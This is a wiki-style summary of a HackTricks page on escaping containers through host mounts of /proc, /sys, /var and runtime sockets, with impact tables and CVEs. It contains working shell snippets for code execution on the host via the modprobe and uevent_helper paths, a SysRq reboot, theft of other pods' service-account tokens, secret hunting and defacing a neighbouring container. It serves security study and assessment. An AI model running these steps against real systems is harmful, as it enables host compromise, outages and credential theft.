---
title: "HackTricks — Sensitive Host Mounts"
tags:
  [
    container-security,
    privilege-escalation,
    host-mounts,
    procfs,
    sysfs,
    hacktricks,
  ]
sources: [hacktricks-sensitive-host-mounts.md]
updated: 2026-05-01
---

# HackTricks — Sensitive Host Mounts

Source: [HackTricks](../entities/hacktricks.md)

## Key Takeaways

Host mounts are one of the most practical container-escape surfaces. The dangerous cases are not limited to `/` — bind mounts of `/proc`, `/sys`, `/var`, runtime sockets, or device paths can expose kernel controls, credentials, neighboring container filesystems, and runtime management. **Mounted `/var` is frequently underestimated.**

## `/proc` Exposure

High-impact paths:

| Path                            | Impact                                                             |
| ------------------------------- | ------------------------------------------------------------------ |
| `/proc/sys/kernel/core_pattern` | **Host code execution** — kernel executes pipe handler after crash |
| `/proc/sys/kernel/modprobe`     | **Host code execution** — redirect kernel module-loader helper     |
| `/proc/sys/fs/binfmt_misc`      | Register handler for magic value → host-context execution          |
| `/proc/sysrq-trigger`           | **Host DoS** — immediate reboot/panic with `echo b > ...`          |
| `/proc/kallsyms`                | Kernel symbol leak, defeats KASLR assumptions                      |
| `/proc/config.gz`               | Kernel configuration for exploit triage (mitigations, features)    |
| `/proc/kmsg` / `/proc/kcore`    | Kernel memory and ring-buffer leak                                 |
| `/proc/[pid]/mem`               | Process memory R/W (conditional: ptrace, Yama, hidepid)            |
| `/proc/[pid]/mountinfo`         | Recover container's host overlay path                              |

### Quick check

```bash
for p in /proc/sys/kernel/core_pattern /proc/sys/kernel/modprobe \
          /proc/sysrq-trigger /proc/kmsg /proc/kallsyms /proc/kcore \
          /proc/sched_debug /proc/1/mountinfo /proc/config.gz; do
  [ -e "$p" ] && ls -l "$p"
done
```

### modprobe helper abuse

```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
```

### SysRq reboot (DoS)

```bash
echo b > /proc/sysrq-trigger   # immediate host reboot
```

## `/sys` Exposure

High-impact paths:

| Path                        | Impact                                                         |
| --------------------------- | -------------------------------------------------------------- |
| `/sys/kernel/uevent_helper` | **Host code execution** — kernel executes helper on uevent     |
| `/sys/kernel/debug`         | Wide kernel-facing surface, developer-oriented, minimal safety |
| `/sys/firmware/efi/efivars` | Firmware-backed boot settings — high severity                  |
| `/sys/kernel/security`      | LSM (AppArmor/SELinux) securityfs interface                    |
| `/sys/kernel/vmcoreinfo`    | Kernel layout / crash-dump info for exploit triage             |

### uevent_helper abuse

```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```

Helper path is interpreted in the **host context** → runs outside current container.

## `/var` Exposure

Mounting host `/var` is underestimated. On modern nodes it contains:

- Runtime sockets (`/var/run/docker.sock`, `crio.sock`)
- Container snapshot directories (`/var/lib/containerd`, `/var/lib/docker`)
- Kubelet-managed pod volumes including **projected service-account tokens**
- Neighboring workload application filesystems

### Kubernetes: steal other pods' tokens

```bash
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<vol>/token)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```

A readable service-account token may turn local code execution into **cluster-wide compromise**.

### Container snapshot tampering

```bash
grep -Rni 'JWT_SECRET\|TOKEN\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' 2>/dev/null | head -n 20
# Plant content in a neighbor's nginx
echo '<html>pwned</html>' > /host-var/lib/containerd/.../fs/usr/share/nginx/html/index2.html
```

## Runtime Sockets (Recap)

Mounted sockets deserving full exploitation (see [runtime-api-and-daemon-exposure](hacktricks-runtime-api-daemon-exposure.md)):

```
/run/containerd/containerd.sock  /var/run/crio/crio.sock
/run/podman/podman.sock          /run/buildkit/buildkitd.sock
/var/run/kubelet.sock
```

## Mount-Related CVEs

| CVE                  | Component      | Impact                                              |
| -------------------- | -------------- | --------------------------------------------------- |
| CVE-2024-21626       | runc           | Leaked dir FD places working dir on host filesystem |
| CVE-2024-23651/23653 | BuildKit       | OverlayFS copy-up race → host-path writes           |
| CVE-2024-1753        | Buildah/Podman | Crafted bind mounts during build expose `/` R/W     |
| CVE-2024-40635       | containerd     | Large `User` value overflows to UID 0               |

## Quick Check Commands

```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock \
  -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```

## Related Pages

- [Container Security](../concepts/container-security.md)
- [Linux Privilege Escalation](../concepts/linux-privilege-escalation.md)
- [HackTricks — Runtime API and Daemon Exposure](hacktricks-runtime-api-daemon-exposure.md)
- [HackTricks — Container Assessment and Hardening](hacktricks-assessment-and-hardening.md)
- [HackTricks](../entities/hacktricks.md)
